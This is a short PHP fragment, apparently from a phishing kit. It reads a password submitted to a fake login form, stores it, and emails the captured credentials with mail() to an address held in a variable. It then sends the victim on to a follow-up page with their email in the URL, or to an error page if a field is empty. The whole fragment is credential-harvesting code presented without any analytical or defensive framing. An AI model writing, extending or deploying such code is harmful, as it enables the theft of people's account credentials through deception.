...
$_SESSION["pw"] = $pw = $_POST['session_password'];
...
if (empty($em) || empty($pw)) {
	header("Location: unexpected_error.php?websrc=$praga&dispatched=$oslo&id=$oslo$praga&email=$em");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: en_do2003.php?websrc=$praga&dispatched=$oslo&id=$oslo$praga&email=$em");
}
